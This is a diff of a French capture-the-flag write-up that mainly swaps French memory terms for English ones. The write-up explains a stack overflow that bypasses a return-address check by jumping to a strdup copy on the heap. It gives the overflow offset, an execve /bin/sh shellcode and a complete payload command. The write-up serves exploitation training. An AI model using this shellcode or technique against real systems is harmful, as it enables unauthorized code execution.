@@ -1,4 +1,4 @@
-# level2
+# level2 — overflow + shellcode heap
 
     void p(void)
     {
@@ -22,13 +22,13 @@
       return;
     }
 
-`unaff_retaddr` c'est l'adresse de retour de p, le programme vérifie ce qu'on ecrit par-dessus avant de continuer. Le test bloque toute adresse de retour qui commence par `0xb` ça couvre la pile (`0xbfxxxxxx`) et libc (`0xb7xxxxxx`), donc pas de retour direct sur la pile, pas de ret2libc. 
+`unaff_retaddr` c'est l'adresse de retour de p, le programme vérifie ce qu'on ecrit par-dessus avant de continuer. Le test bloque toute adresse de retour qui commence par `0xb` ça couvre la stack (`0xbfxxxxxx`) et libc (`0xb7xxxxxx`), donc pas de retour direct sur la stack, pas de ret2libc. 
 
     0xffffffff ┐
             │  réservé au noyau (pas accessible depuis ton programme)
     0xc0000000 ┘
 
-    0xbfffffff ┐  PILE les variables locales, argv, les variables
+    0xbfffffff ┐  stack les variables locales, argv, les variables
             │  d'environnement. Grandit vers le BAS (les adresses
             │  diminuent à chaque appel de fonction imbriqué)
     ...     ┘
@@ -43,7 +43,7 @@
 
 
 
-    0x0804c1c0 ┐  TAS (heap) c'est ici que `malloc`/`strdup`
+    0x0804c1c0 ┐  heap (heap) c'est ici que `malloc`/`strdup`
             │  vont chercher de la place. Grandit vers le HAUT.
     0x08049000 ┘  (fin du .bss/.data du programme)
 
@@ -51,7 +51,7 @@
             │  tes chaînes de caractères statiques, etc.
     0x08048000 ┘  adresse de chargement fixe (binaire EXEC, pas PIE)
 
-Sauf que juste après le check, `strdup(local_50)` recopie ton buffer (donc ton shellcode) sur le tas, à une adresse basse (`0x0804xxxx`) pas couverte par le test. Il suffit de rediriger l'adresse de retour vers cette copie sur le tas au lieu de la pile.
+Sauf que juste après le check, `strdup(local_50)` recopie ton buffer (donc ton shellcode) sur le heap, à une adresse basse (`0x0804xxxx`) pas couverte par le test. Il suffit de rediriger l'adresse de retour vers cette copie sur le heap au lieu de la stack.
 
 **Trouver l'offset avec gef**
 
@@ -68,7 +68,7 @@ Même principe qu'avant, buffer différent donc offset différent :
 
 Ça donne l'offset : 80
 
-**Trouver l'adresse du tas après `strdup`**
+**Trouver l'adresse du heap après `strdup`**
 
     gef> disas p
     gef> b *0x804853d
@@ -83,7 +83,7 @@ https://picoctfsolutions.com/tools/pwntools-payload
 
     \x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
 
-Payload : shellcode (21 octets) + bourrage jusqu'à l'offset 80 (`80 - 21 = 59` octets) + adresse du tas :
+Payload : shellcode (21 octets) + bourrage jusqu'à l'offset 80 (`80 - 21 = 59` octets) + adresse du heap :
 
     (printf '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80'; printf 'A%.0s' {1..59}; printf '\x08\xa0\x04\x08') > /tmp/payload
 
